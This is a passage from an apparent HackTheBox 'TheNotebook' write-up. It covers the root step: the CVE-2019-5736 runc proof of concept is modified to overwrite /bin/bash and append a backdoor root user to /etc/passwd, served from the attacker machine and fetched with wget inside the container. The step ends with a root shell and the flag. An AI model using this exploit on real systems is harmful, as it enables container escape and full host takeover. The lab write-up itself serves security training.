Docker version 18.06.0-ce, build 0ffa825
</code></pre></div></div>

<p>On the attacker machine the <a href="https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go">PoC from Frichetten</a> was downloaded, the payload was adjusted to inject a malicious root user, and then hosted for the download on the target:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span>wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go <span class="nt">-O</span> privesc.go
...
â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span>nano privesc.go
...
var payload <span class="o">=</span> <span class="s2">"#!/bin/bash </span><span class="se">\n</span><span class="s2"> echo 'root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd"</span>
...
fd, err :<span class="o">=</span> os.Create<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
...
fmt.Println<span class="o">(</span><span class="s2">"[+] Overwritten /bin/bash successfully"</span><span class="o">)</span>
...

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span>go build privesc.go

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80

<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<p>The exploit was downloaded inside the docker container and executed:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 /bin/bash
root@719a30d9c793:/opt/webapp# wget 10.10.14.24/privesc
<span class="nt">--2021-05-01</span> 11:24:09--  http://10.10.14.24/privesc
...
root@719a30d9c793:/opt/webapp# <span class="nb">chmod</span> +x privesc
root@719a30d9c793:/opt/webapp# ./privesc
<span class="o">[</span>+] Overwritten /bin/bash successfully
 &lt; exploit paused <span class="o">&gt;</span>
</code></pre></div></div>

<p>From another SSH session the exploit was then triggered:<br /></p>

<p><em>Session 2:</em></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/loot]
â””â”€<span class="nv">$ </span>ssh noah@10.10.10.230 <span class="nt">-i</span> noah.key
...
noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 /bin/bash
No <span class="nb">help </span>topic <span class="k">for</span> <span class="s1">'/bin/bash'</span>
</code></pre></div></div>

<p><em>Session 1:</em></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="o">[</span>+] Overwritten /bin/bash successfully
 &lt; exploit paused <span class="o">&gt;</span>
<span class="o">[</span>+] Found the PID: 34
<span class="o">[</span>+] Successfully got the file handle
<span class="o">[</span>+] Successfully got write handle &amp;<span class="o">{</span>0xc0000a8180<span class="o">}</span>
</code></pre></div></div>

<p>Finally it was escalated to root switching to the injected <code class="language-plaintext highlighter-rouge">root2</code> user:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span>su root2
Password: evil
root@thenotebook:/home/noah# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">cat</span> /root/root.txt <span class="o">&amp;&amp;</span> ifconfig <span class="nt">-a</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
thenotebook
2328e98b072c67c6d418ae24d00523d3
docker0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d6:10:3f:8a  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 12886  bytes 699043 <span class="o">(</span>699.0 KB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19288  bytes 32590700 <span class="o">(</span>32.5 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens160: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.10.230  netmask 255.255.255.0  broadcast 10.10.10.255
        ether 00:50:56:b9:d5:cf  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 39715  bytes 36782225 <span class="o">(</span>36.7 MB<span class="o">)</span>
        RX errors 0  dropped 171  overruns 0  frame 0
        TX packets 35339  bytes 2907270 <span class="o">(</span>2.9 MB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 4  bytes 200 <span class="o">(</span>200.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 200 <span class="o">(</span>200.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth9864dad: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        ether 32:f8:e1:c2:77:95  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13  bytes 546 <span class="o">(</span>546.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethff601c6: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        ether da:d1:0c:17:2a:4b  txqueuelen 0  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre></div></div>

<h2 id="trophy">Trophy</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A bug is never just a mistake. It represents something bigger.
An error of thinking. That makes you who you are.  
- Elliot Alderson (Mr. Robot)
</code></pre></div></div>

<style>
.share {
  display: block;
  margin-left: auto;
  margin-right: auto;
  text-align: center;
}
</style>

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" display="none" version="1.1"><defs>
    <symbol id="icon-menu" viewBox="0 0 1024 1024"><path class="path1" d="M128 213.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 725.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5zM128 469.333h768q17.667 0 30.167 12.5t12.5 30.167-12.5 30.167-30.167 12.5h-768q-17.667 0-30.167-12.5t-12.5-30.167 12.5-30.167 30.167-12.5z" /></symbol>
    <symbol id="icon-search" viewBox="0 0 951 1024"><path class="path1" d="M658.286 475.429q0-105.714-75.143-180.857t-180.857-75.143-180.857 75.143-75.143 180.857 75.143 180.857 180.857 75.143 180.857-75.143 75.143-180.857zM950.857 950.857q0 29.714-21.714 51.429t-51.429 21.714q-30.857 0-51.429-21.714l-196-195.429q-102.286 70.857-228 70.857-81.714 0-156.286-31.714t-128.571-85.714-85.714-128.571-31.714-156.286 31.714-156.286 85.714-128.571 128.571-85.714 156.286-31.714 156.286 31.714 128.571 85.714 85.714 128.571 31.714 156.286q0 125.714-70.857 228l196 196q21.143 21.143 21.143 51.429z" /></symbol>
    <symbol id="icon-email" viewBox="0 0 1024 1024"><path class="path1" d="M950.857 859.429v-438.857q-18.286 20.571-39.429 37.714-153.143 117.714-243.429 193.143-29.143 24.571-47.429 38.286t-49.429 27.714-58.571 14h-1.143q-27.429 0-58.571-14t-49.429-27.714-47.429-38.286q-90.286-75.429-243.429-193.143-21.143-17.143-39.429-37.714v438.857q0 7.429 5.429 12.857t12.857 5.429h841.143q7.429 0 12.857-5.429t5.429-12.857zM950.857 258.857v-14t-0.286-7.429-1.714-7.143-3.143-5.143-5.143-4.286-8-1.429h-841.143q-7.429 0-12.857 5.429t-5.429 12.857q0 96 84 162.286 110.286 86.857 229.143 181.143 3.429 2.857 20 16.857t26.286 21.429 25.429 18 28.857 15.714 24.571 5.143h1.143q11.429 0 24.571-5.143t28.857-15.714 25.429-18 26.286-21.429 20-16.857q118.857-94.286 229.143-181.143 30.857-24.571 57.429-66t26.571-75.143zM1024 237.714v621.714q0 37.714-26.857 64.571t-64.571 26.857h-841.143q-37.714 0-64.571-26.857t-26.857-64.571v-621.714q0-37.714 26.857-64.571t64.571-26.857h841.143q37.714 0 64.571 26.857t26.857 64.571z" /></symbol>
    <symbol id="icon-close" viewBox="0 0 805 1024"><path class="path1" d="M741.714 755.429q0 22.857-16 38.857l-77.714 77.714q-16 16-38.857 16t-38.857-16l-168-168-168 168q-16 16-38.857 16t-38.857-16l-77.714-77.714q-16-16-16-38.857t16-38.857l168-168-168-168q-16-16-16-38.857t16-38.857l77.714-77.714q16-16 38.857-16t38.857 16l168 168 168-168q16-16 38.857-16t38.857 16l77.714 77.714q16 16 16 38.857t-16 38.857l-168 168 168 168q16 16 16 38.857z" /></symbol>
    <symbol id="icon-twitter" viewBox="0 0 951 1024"><path class="path1" d="M925.714 233.143q-38.286 56-92.571 95.429 0.571 8 0.571 24 0 74.286-21.714 148.286t-66 142-105.429 120.286-147.429 83.429-184.571 31.143q-154.857 0-283.429-82.857 20 2.286 44.571 2.286 128.571 0 229.143-78.857-60-1.143-107.429-36.857t-65.143-91.143q18.857 2.857 34.857 2.857 24.571 0 48.571-6.286-64-13.143-106-63.714t-42-117.429v-2.286q38.857 21.714 83.429 23.429-37.714-25.143-60-65.714t-22.286-88q0-50.286 25.143-93.143 69.143 85.143 168.286 136.286t212.286 56.857q-4.571-21.714-4.571-42.286 0-76.571 54-130.571t130.571-54q80 0 134.857 58.286 62.286-12 117.143-44.571-21.143 65.714-81.143 101.714 53.143-5.714 106.286-28.571z" /></symbol>
    <symbol id="icon-facebook" viewBox="0 0 585 1024"><path class="path1" d="M548 6.857v150.857h-89.714q-49.143 0-66.286 20.571t-17.143 61.714v108h167.429l-22.286 169.143h-145.143v433.714h-174.857v-433.714h-145.714v-169.143h145.714v-124.571q0-106.286 59.429-164.857t158.286-58.571q84 0 130.286 6.857z" /></symbol>
    <symbol id="icon-rss" viewBox="0 0 805 1024"><path class="path1" d="M219.429 768q0 45.714-32 77.714t-77.714 32-77.714-32-32-77.714 32-77.714 77.714-32 77.714 32 32 77.714zM512 838.286q1.143 16-9.714 27.429-10.286 12-26.857 12h-77.143q-14.286 0-24.571-9.429t-11.429-23.714q-12.571-130.857-105.429-223.714t-223.714-105.429q-14.286-1.143-23.714-11.429t-9.429-24.571v-77.143q0-16.571 12-26.857 9.714-9.714 24.571-9.714h2.857q91.429 7.429 174.857 46t148 103.714q65.143 64.571 103.714 148t46 174.857zM804.571 839.429q1.143 15.429-10.286 26.857-10.286 11.429-26.286 11.429h-81.714q-14.857 0-25.429-10t-11.143-24.286q-6.857-122.857-57.714-233.429t-132.286-192-192-132.286-233.429-58.286q-14.286-0.571-24.286-11.143t-10-24.857v-81.714q0-16 11.429-26.286 10.286-10.286 25.143-10.286h1.714q149.714 7.429 286.571 68.571t243.143 168q106.857 106.286 168 243.143t68.571 286.571z" /></symbol>
    <symbol id="icon-google-plus" viewBox="0 0 951 1024"><path class="path1" d="M420 454.857q0 20.571 18.286 40.286t44.286 38.857 51.714 42 44 59.429 18.286 81.143q0 51.429-27.429 98.857-41.143 69.714-120.571 102.571t-170.286 32.857q-75.429 0-140.857-23.714t-98-78.571q-21.143-34.286-21.143-74.857 0-46.286 25.429-85.714t67.714-65.714q74.857-46.857 230.857-57.143-18.286-24-27.143-42.286t-8.857-41.714q0-20.571 12-48.571-26.286 2.286-38.857 2.286-84.571 0-142.571-55.143t-58-139.714q0-46.857 20.571-90.857t56.571-74.857q44-37.714 104.286-56t124.286-18.286h238.857l-78.857 50.286h-74.857q42.286 36 64 76t21.714 91.429q0 41.143-14 74t-33.714 53.143-39.714 37.143-34 35.143-14 37.714zM336.571 400q21.714 0 44.571-9.429t37.714-24.857q30.286-32.571 30.286-90.857 0-33.143-9.714-71.429t-27.714-74-48.286-59.143-66.857-23.429q-24 0-47.143 11.143t-37.429 30q-26.857 33.714-26.857 91.429 0 26.286 5.714 55.714t18 58.857 29.714 52.857 42.857 38.286 55.143 14.857zM337.714 898.857q33.143 0 63.714-7.429t56.571-22.286 41.714-41.714 15.714-62.286q0-14.286-4-28t-8.286-24-15.429-23.714-16.857-20-22-19.714-20.857-16.571-23.714-17.143-20.857-14.857q-9.143-1.143-27.429-1.143-30.286 0-60 4t-61.429 14.286-55.429 26.286-39.143 42.571-15.429 60.286q0 40 20 70.571t52.286 47.429 68 25.143 72.857 8.286zM800.571 398.286h121.714v61.714h-121.714v125.143h-60v-125.143h-121.143v-61.714h121.143v-124h60v124z" /></symbol>
    <symbol id="icon-github-alt" viewBox="0 0 951 1024"><path class="path1" d="M365.714 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM731.429 694.857q0 22.857-7.143 46.857t-24.571 43.429-41.429 19.429-41.429-19.429-24.571-43.429-7.143-46.857 7.143-46.857 24.571-43.429 41.429-19.429 41.429 19.429 24.571 43.429 7.143 46.857zM822.857 694.857q0-68.571-39.429-116.571t-106.857-48q-23.429 0-111.429 12-40.571 6.286-89.714 6.286t-89.714-6.286q-86.857-12-111.429-12-67.429 0-106.857 48t-39.429 116.571q0 50.286 18.286 87.714t46.286 58.857 69.714 34.286 80 16.857 85.143 4h96q46.857 0 85.143-4t80-16.857 69.714-34.286 46.286-58.857 18.286-87.714zM950.857 594.286q0 118.286-34.857 189.143-21.714 44-60.286 76t-80.571 49.143-97.143 27.143-98 12.571-95.429 2.571q-44.571 0-81.143-1.714t-84.286-7.143-87.143-17.143-78.286-29.429-69.143-46.286-49.143-65.714q-35.429-70.286-35.429-189.143 0-135.429 77.714-226.286-15.429-46.857-15.429-97.143 0-66.286 29.143-124.571 61.714 0 108.571 22.571t108 70.571q84-20 176.571-20 84.571 0 160 18.286 60-46.857 106.857-69.143t108-22.286q29.143 58.286 29.143 124.571 0 49.714-15.429 96 77.714 91.429 77.714 227.429z" /></symbol>
    <symbol id="icon-right-arrow"><path d="M21.205,5.007c-0.429-0.444-1.143-0.444-1.587,0c-0.429,0.429-0.429,1.143,0,1.571l8.047,8.047H1.111  C0.492,14.626,0,15.118,0,15.737c0,0.619,0.492,1.127,1.111,1.127h26.554l-8.047,8.032c-0.429,0.444-0.429,1.159,0,1.587  c0.444,0.444,1.159,0.444,1.587,0l9.952-9.952c0.444-0.429,0.444-1.143,0-1.571L21.205,5.007z" fill="#efb102" /></symbol>
    <symbol id="icon-linkedin" viewBox="0 0 12 14"><path class="path1" d="M1.852 11.047h1.805v-5.422h-1.805v5.422zM3.773 3.953q-0.008-0.406-0.281-0.672t-0.727-0.266-0.738 0.266-0.285 0.672q0 0.398 0.277 0.668t0.723 0.27h0.008q0.461 0 0.742-0.27t0.281-0.668zM8.344 11.047h1.805v-3.109q0-1.203-0.57-1.82t-1.508-0.617q-1.062 0-1.633 0.914h0.016v-0.789h-1.805q0.023 0.516 0 5.422h1.805v-3.031q0-0.297 0.055-0.438 0.117-0.273 0.352-0.465t0.578-0.191q0.906 0 0.906 1.227v2.898zM12 3.25v7.5q0 0.93-0.66 1.59t-1.59 0.66h-7.5q-0.93 0-1.59-0.66t-0.66-1.59v-7.5q0-0.93 0.66-1.59t1.59-0.66h7.5q0.93 0 1.59 0.66t0.66 1.59z"></path></symbol>
    <symbol id="icon-instagram" viewBox="0 0 438.536 438.536"><path class="path1" d="M421.981,16.562C410.941,5.519,397.711,0,382.298,0H56.248C40.83,0,27.604,5.521,16.561,16.562
		C5.52,27.6,0.001,40.828,0.001,56.243V382.29c0,15.413,5.518,28.644,16.56,39.683c11.043,11.04,24.272,16.563,39.687,16.563
		h326.046c15.41,0,28.644-5.523,39.684-16.563c11.043-11.039,16.557-24.27,16.557-39.683V56.243
		C438.534,40.825,433.021,27.604,421.981,16.562z M157.462,158.025c17.224-16.652,37.924-24.982,62.097-24.982
		c24.36,0,45.153,8.33,62.381,24.982c17.228,16.655,25.837,36.785,25.837,60.386c0,23.598-8.609,43.729-25.837,60.379
		c-17.228,16.659-38.014,24.988-62.381,24.988c-24.172,0-44.87-8.336-62.097-24.988c-17.228-16.652-25.841-36.781-25.841-60.379
		C131.621,194.81,140.234,174.681,157.462,158.025z M388.865,370.589c0,4.945-1.718,9.083-5.141,12.416
		c-3.433,3.33-7.519,4.996-12.282,4.996h-305.2c-4.948,0-9.091-1.666-12.419-4.996c-3.333-3.326-4.998-7.471-4.998-12.416V185.575
		H89.08c-3.805,11.993-5.708,24.462-5.708,37.402c0,36.553,13.322,67.715,39.969,93.511c26.65,25.786,58.721,38.685,96.217,38.685
		c24.744,0,47.583-5.903,68.527-17.703c20.937-11.807,37.486-27.839,49.676-48.112c12.183-20.272,18.274-42.4,18.274-66.38
		c0-12.94-1.91-25.406-5.715-37.402h38.547v185.014H388.865z M388.865,115.626c0,5.52-1.903,10.184-5.716,13.99
		c-3.805,3.809-8.466,5.711-13.989,5.711h-49.676c-5.517,0-10.185-1.903-13.99-5.711c-3.806-3.806-5.708-8.47-5.708-13.99V68.522
		c0-5.33,1.902-9.945,5.708-13.848c3.806-3.901,8.474-5.854,13.99-5.854h49.676c5.523,0,10.185,1.952,13.989,5.854
		c3.812,3.903,5.716,8.518,5.716,13.848V115.626z" /></symbol>
    <symbol id="icon-telegram" viewBox="0 0 80 80">
    <path d="M 70.511719 10.986328 C 69.833089 11.015588 69.157051 11.196735 68.537109 11.4375 L 68.535156 11.4375 C 67.931048 11.673297 64.049934 13.281226 58.392578 15.628906 C 52.735222 17.976586 45.3821 21.032905 38.091797 24.064453 C 23.51119 30.12755 9.1835937 36.091797 9.1835938 36.091797 L 9.2480469 36.068359 C 9.2480469 36.068359 8.4485192 36.330303 7.6484375 36.871094 C 7.2483967 37.141489 6.8283994 37.486951 6.4960938 37.966797 C 6.163788 38.446643 5.9299055 39.103809 6.0195312 39.808594 C 6.1812736 41.080477 7.0482024 41.912426 7.7636719 42.412109 C 8.4791414 42.911793 9.1660156 43.148437 9.1660156 43.148438 L 9.1738281 43.152344 L 23.1875 47.785156 C 23.418097 48.587707 27.163839 61.631062 28.046875 64.384766 C 28.50876 65.826709 28.935922 66.627156 29.335938 67.130859 C 29.535944 67.382711 29.733459 67.561543 29.931641 67.683594 C 30.016841 67.736064 30.101273 67.771554 30.183594 67.802734 C 30.197014 67.807834 30.211349 67.817736 30.224609 67.822266 C 30.252855 67.83191 30.267938 67.831811 30.302734 67.839844 C 31.62302 68.328201 32.738281 67.476563 32.738281 67.476562 L 32.769531 67.453125 L 42.376953 59 L 56.585938 70.394531 L 56.710938 70.449219 C 58.991132 71.431474 60.875783 70.891854 61.970703 70.027344 C 63.065623 69.162833 63.509766 68.03125 63.509766 68.03125 L 63.544922 67.943359 L 73.794922 16.097656 C 74.046117 14.98858 74.071392 14.057617 73.853516 13.257812 C 73.635643 12.458006 73.128863 11.807693 72.5 11.443359 C 71.871137 11.079025 71.190348 10.957066 70.511719 10.986328 z M 70.566406 13.021484 C 70.96444 13.004357 71.29991 13.059037 71.498047 13.173828 C 71.696183 13.288619 71.824951 13.420226 71.923828 13.783203 C 72.022708 14.14618 72.046557 14.758873 71.84375 15.654297 L 71.839844 15.667969 L 61.630859 67.3125 C 61.615849 67.34707 61.352842 67.965627 60.730469 68.457031 C 60.102941 68.952505 59.248838 69.318622 57.578125 68.626953 L 34.738281 50.310547 A 1.0001 1.0001 0 0 0 34 50 A 1.0001 1.0001 0 0 0 32.988281 50.974609 L 30.384766 64.923828 C 30.251656 64.61729 30.108215 64.257609 29.953125 63.773438 C 29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" />
     </symbol>
     <symbol id="icon-youtube" viewBox="0 0 24 24">
       <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" />
    </symbol>
    <symbol id="icon-gitlab" viewBox="-5 -15 220 200">
      <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" />
      <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" />
      <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" />
      &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt;
      <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" />
      <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" />
      <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" />
    </symbol>
</defs></svg>

<p><br /></p>
<section class="share">

    <h2>Share</h2>

    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=HackTheBox &quot;TheNotebook&quot; wirteup is now available!%20http://localhost:4000/writeups/HackTheBox/2021-07-31-TheNotebook/%20via%20&#64;0xbro1&amp;hashtags=HackTheBox,Medium,Linux,JWT,SSRF,authorization-bypass,RCE,insecure-file-permissions,CVE-2019-5736,docker-exec-privesc,runc-privesc,B2R,writeup,lateral-movement," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
    </a>

    <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/writeups/HackTheBox/2021-07-31-TheNotebook/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
    </a>

    <a aria-label="Share on Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:4000/writeups/HackTheBox/2021-07-31-TheNotebook/&amp;title=TheNotebook&amp;summary=TheNoteBook is a medium difficulty Linux box running a custom web application vulnerable to authorization bypass caused by a SSRF that allows to validate arbitrary JWT.&amp;source=
    " onclick="window.open(this.href, 'linkedin-share','width=580,height=296');return false;" title="Share on Linkedin">
        <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg>
    </a>

</section>

:ET